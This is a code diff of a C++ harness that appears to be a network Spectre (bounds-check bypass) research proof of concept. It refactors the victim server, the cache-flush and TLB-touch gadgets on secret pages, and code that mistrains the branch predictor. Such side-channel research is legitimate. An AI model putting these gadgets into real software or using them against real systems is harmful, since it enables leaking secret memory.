@@ -44,7 +44,6 @@
 Victim globals.
 ********************************************************************/
 constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
-//constexpr size_t MAX_LEN = 256 * 512;
 
 /* Other global (optional) parameters */
 uint16_t udp_port = 7777;
@@ -83,6 +82,66 @@ void victim_function(size_t x) {
   if (x < array1_size) {
     temp ^= array2[array1[x] * 512];
   }
+}
+
+
+/********************************************************************
+Victim gadgets potentially leveraged by attacker.
+********************************************************************/
+inline void gadget_flush_condition() {
+  _mm_clflush( &array1_size );
+
+  /* Delay until flush completes */
+#ifndef NOMFENCE
+  _mm_mfence();
+#else
+  for (volatile int z = 0; z < 100; z++) {}
+#endif
+}
+
+
+inline bool gadget_touch_va(const size_t va) {
+  volatile static uint8_t tmp;
+
+  // Fill TLB with entry correspoding to va:
+  // -- side effect: pulls first cache line of page into cache.
+  const uint8_t* page = reinterpret_cast<const uint8_t*>(va & ~(PAGE_SIZE-1));
+  printf(" -touching page for TLB with 1 byte load at VA: %p\n", page);
+
+  tmp ^= *page;
+  return tmp == 0;  // unsued return
+}
+
+
+inline bool gadget_touch_page(const size_t x) {
+  volatile static uint8_t tmp;
+
+  // Calculate pointer to first byte in page:
+  // - mimics array1-relative addressing for simplicity...
+  const uint8_t* page = reinterpret_cast<const uint8_t*>(
+        reinterpret_cast<size_t>(&array1[x]) & ~(PAGE_SIZE-1));
+  printf("- touching page for TLB with 1 byte load at VA: %p\n", page);
+
+  // Fill TLB with entry correspoding to x:
+  // - side effect: pulls first cache line of page into cache
+  tmp ^= *page;
+  return tmp == 0;  // unsued return
+}
+
+
+inline bool gadget_touch_secrets(size_t i = 0) {
+  volatile uint8_t tmp;
+
+  // Fill TLB with entry correspoding to each secret:
+  // -- side effect: pulls first cache line of each page into cache.
+  const size_t page1 = reinterpret_cast<size_t>(&secret_heap[i])   & ~(PAGE_SIZE-1);
+  const size_t page2 = reinterpret_cast<size_t>(&secret_global[i]) & ~(PAGE_SIZE-1);
+  const size_t page3 = reinterpret_cast<size_t>(&secret_stack[i])  & ~(PAGE_SIZE-1);
+
+  tmp = gadget_touch_va(page1);
+  tmp &= gadget_touch_va(page2);
+  tmp &= gadget_touch_va(page3);
+  return tmp;
 }
 
 
@@ -250,160 +309,7 @@ void parse_args(int argc, char* const argv[]) {
 /********************************************************************
 UDP socket functions.
 ********************************************************************/
-inline void flush_array2() {
-#ifndef NOCLFLUSH
-    /* Flush array2[256*(0..255)] from cache */
-    for (int i = 0; i < 256; i++)
-      _mm_clflush( &array2[i*512] ); /* intrinsic for clflush instruction */
-#else
-    /* Flush array2[256*(0..255)] from cache
-       using long SSE instruction several times */
-    for (int j = 0; j < 16; j++)
-      for (int i = 0; i < 256; i++)
-        flush_memory_sse( &array2[i*512] );
-#endif
-}
-
-
-inline void gadget_flush_condition() {
-#ifndef NOCLFLUSH
-      _mm_clflush( &array1_size );
-#else
-      /* Alternative to using clflush to flush the CPU cache */
-      /* Read addresses at 4096-byte intervals out of a large array.
-         Do this around 2000 times, or more depending on CPU cache size. */
-      for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {
-        junk2 = cache_flush_array[l];
-      }
-#endif
-
-      /* Delay until flush completes */
-#ifndef NOMFENCE
-      _mm_mfence();
-#else
-      for (volatile int z = 0; z < 100; z++) {}
-#endif
-}
-
-
-inline bool gadget_touch_va(const size_t va) {
-  volatile static uint8_t tmp;
-
-  // Fill TLB with entry correspoding to va:
-  // -- side effect: pulls first cache line of page into cache.
-  const uint8_t* page = reinterpret_cast<const uint8_t*>(va & ~(PAGE_SIZE-1));
-  printf(" -touching page for TLB with 1 byte load at VA: %p\n", page);
-
-  tmp ^= *page;
-  return tmp == 0;  // unsued return
-}
-
-
-inline bool gadget_touch_page(const size_t x) {
-  volatile static uint8_t tmp;
-
-  // Calculate pointer to first byte in page:
-  // - mimics array1-relative addressing for simplicity...
-  const uint8_t* page = reinterpret_cast<const uint8_t*>(
-        reinterpret_cast<size_t>(&array1[x]) & ~(PAGE_SIZE-1));
-  printf("- touching page for TLB with 1 byte load at VA: %p\n", page);
-
-  // Fill TLB with entry correspoding to x:
-  // - side effect: pulls first cache line of page into cache
-  tmp ^= *page;
-  return tmp == 0;  // unsued return
-}
-
-
-inline bool gadget_touch_secrets(size_t i = 0) {
-  volatile uint8_t tmp;
-
-  // Fill TLB with entry correspoding to each secret:
-  // -- side effect: pulls first cache line of each page into cache.
-  const size_t page1 = reinterpret_cast<size_t>(&secret_heap[i])   & ~(PAGE_SIZE-1);
-  const size_t page2 = reinterpret_cast<size_t>(&secret_global[i]) & ~(PAGE_SIZE-1);
-  const size_t page3 = reinterpret_cast<size_t>(&secret_stack[i])  & ~(PAGE_SIZE-1);
-
-  tmp = gadget_touch_va(page1);
-  tmp &= gadget_touch_va(page2);
-  tmp &= gadget_touch_va(page3);
-  return tmp;
-}
-
-
-void helper(size_t malicious_x, size_t training_x = 0) {
-  gadget_touch_secrets(); // ensures secret is cached (optional?)
-
-  /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-  for (int j = 29; j >= 0; j--) {
-    gadget_flush_condition();  // ensures speculation occurs (optional?)
-
-    /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-    /* Avoid jumps in case those tip off the branch predictor */
-    size_t x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-    x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-    x = training_x ^ (x & (malicious_x ^ training_x));
-
-//    auto x = ((j % 6) == 0) ? malicious_x : training_x;
-
-    /* Call the victim function! */
-    victim_function(x);
-  }
-  /// attacker may now measure cache state...
-}
-
-
-void helper_simple(size_t x) {
-  gadget_flush_condition();  // Critical to allow speculation!
-
-  /* Call the victim function! */
-  victim_function(x);
-}
-
-
-void recv_worker(uint16_t port) {
-  constexpr size_t ARRAY1_LEN = 16;
-  uint8_t pkt_buf[2048];
-
-  SocketUDP s;
-  s.open(port);
-
-  std::cout << "["<<port<<"] - Receive worker thread listening." << std::endl;
-
-  size_t tries = 0;
-  for (;;) {
-    auto bytes = s.recv(pkt_buf, sizeof(pkt_buf));
-    if (bytes == sizeof(msg)) {
-      msg& m = reinterpret_cast<msg&>(pkt_buf);
-      auto x = m.x;
-      Request fn = m.fn;
-
-#ifdef DEBUG
-      std::cout << "["<<port<<"]- Received msg of " << bytes << " bytes.\n";
-      std::cout << "x=" << x << std::endl;
-#endif
-
-      // Target malicious_x:
-      auto malicious_x = x;
-
-      // Pick a valid training_x:
-      // - Note: we will be blind to the cache line at this training_x...
-      size_t training_x = (tries++ * 13) % ARRAY1_LEN;
-      m.x = training_x;   // let attacker know the training_x used...
-
-      // Train victom_function training_x, then poke with malicious_x:
-      helper(malicious_x, training_x);
-      s.send(&m, sizeof(m));
-    }
-    else {
-      std::cerr << "["<<port<<"]- Received an unexpected" << bytes << "...\n";
-      return;
-    }
-  }
-}
-
-
-void recv_worker_v2(uint16_t port) {
+void victim_worker(uint16_t port) {
   uint8_t pkt_buf[2048];
 
   SocketUDP s;
@@ -428,7 +334,6 @@ void recv_worker_v2(uint16_t port) {
 #ifdef DEBUG
         std::cout << "Calling helper_simple("<<x<<")" << std::endl;
 #endif
-//        helper_simple(x);
         victim_function(x);
         break;
       case FN_EVICT_CONDITION:
@@ -439,7 +344,6 @@ void recv_worker_v2(uint16_t port) {
         break;
       case FN_TOUCH_SECRET:
         std::cout << "Emulating gadget: touch_secret("<<x<<")" << std::endl;
-//        touch_secret(x);
         gadget_touch_secrets(x);
         break;
       case FN_TOUCH_PAGE:
@@ -460,7 +364,6 @@ void recv_worker_v2(uint16_t port) {
     }
   }
 }
-
 
 
 
@@ -487,7 +390,7 @@ int main(int argc, char* const argv[]) {
   CPU_SET(1, &cpuset);
 
   // Setup receive thread to imitate server:
-  std::thread t(recv_worker_v2, udp_port);
+  std::thread t(victim_worker, udp_port);
   int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
   if (rc != 0) {
     std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
